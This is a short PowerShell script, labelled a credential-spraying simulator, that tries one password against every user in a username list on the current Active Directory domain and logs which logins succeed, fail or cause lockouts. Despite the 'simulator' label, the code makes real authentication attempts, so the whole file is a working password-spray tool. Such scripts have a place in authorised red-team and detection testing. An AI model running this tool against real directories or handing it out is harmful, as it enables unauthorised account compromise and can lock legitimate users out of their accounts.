# Credential_Spraying_Simulator/script.ps1

<#
.SYNOPSIS
Simulates a credential spray attack against internal Active Directory users.

.DESCRIPTION
Attempts login against a list of usernames using a single password.
Logs success/failure and alerts if any accounts are locked out.
#>

param (
    [string]$UserListPath = "$PSScriptRoot\usernames.txt",
    [string]$Password = "Spring2025!"
)

$domain = $env:USERDOMAIN
$logPath = "$PSScriptRoot\spray_results.log"

if (!(Test-Path $UserListPath)) {
    Write-Host "[X] User list not found at $UserListPath"
    exit
}

$usernames = Get-Content $UserListPath
Write-Host "[+] Loaded $($usernames.Count) usernames from $UserListPath"
Write-Host "[+] Starting credential spraying with password: $Password`n"

foreach ($user in $usernames) {
    $username = "$domain\$user"
    try {
        $creds = New-Object System.Management.Automation.PSCredential ($username, (ConvertTo-SecureString $Password -AsPlainText -Force))
        $null = (New-Object DirectoryServices.DirectoryEntry "", $creds.Username, $creds.Password).NativeObject

        $message = "[✓] SUCCESS - $username"
        Write-Host $message -ForegroundColor Green
    } catch {
        if ($_.Exception.Message -like "*account is locked*") {
            $message = "[!] LOCKED OUT - $username"
            Write-Host $message -ForegroundColor Red
        } else {
            $message = "[X] FAIL - $username"
            Write-Host $message -ForegroundColor Yellow
        }
    }
    $message | Out-File -FilePath $logPath -Append
    Start-Sleep -Seconds 1  # Respectful delay
}

Write-Host "`n[✓] Spray simulation complete. Logs saved to $logPath"
